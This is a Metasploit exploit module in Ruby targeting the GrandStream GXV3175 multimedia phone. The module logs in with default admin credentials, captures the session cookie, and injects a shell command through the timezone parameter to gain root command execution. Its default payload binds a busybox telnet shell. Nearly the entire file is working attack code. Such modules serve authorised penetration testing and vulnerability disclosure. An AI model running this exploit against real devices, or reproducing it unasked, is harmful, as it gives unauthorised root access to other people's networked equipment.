##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Multimedia Phone/ ] }

 

  def initialize(info={})
    super(update_info(info,
      'Name'           => "GrandStream GXV3175 cmd exec",
      'Description'    => "Uses shell injection in timezone parameter, runs as r00t",
      'License'        => "GPL",
      'Author'         =>
        [
          'Caleb Anderson - Context Information Security'
        ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'       => 8190,
          'DisableNops' => true,
          'Compat'          =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic busybox_telnetd'
            },
          
        },
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd' },
      'Platform'       => %w{ linux unix },
      'Targets'        =>
        [
          ['GrandStream GVX3175', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "17/09/2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('USERNAME',  [true, 'Grandstream admin username', 'admin']),
          OptString.new('PASSWORD',  [true, 'Grandstream admin password', 'admin'])
        ], self.class)
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "/"
    })

    if res and res.body =~ /GXV3175/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  alias :check_simple :check

  def get_cookie
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri("manager"),
      'vars_get' => {
        'action'   => 'login',
        'Username' => datastore['USERNAME'],
        'Secret'   => datastore['PASSWORD']
      }
    })  
    if res and res.headers['Set-Cookie'] =~ /phonecookie=("[a-f0-9]+")/
      return $1
    else
      return nil
    end
  end

  def execute_command(command)
    http_handler = ((datastore['SSL']) ? "https" : "http")
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri("manager"),
      'cookie'    => "phonecookie=#{@phonecookie}",
      'vars_get'  => {"action"   => "settimezone",
                      "timezone" => "`#{command};`"}
    })
    return res
  end

  def exploit
    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Attempting to login...")
    @phonecookie = get_cookie
    if @phonecookie.nil?
      fail_with(Failure::NoAccess, "#{peer} - Unable to retrieve phonecookie")
    end
    print_good("#{peer} - Authentication successful")

    print_status("#{peer} - Sending malicious request...")
    execute_command(payload.encoded)
  end
end
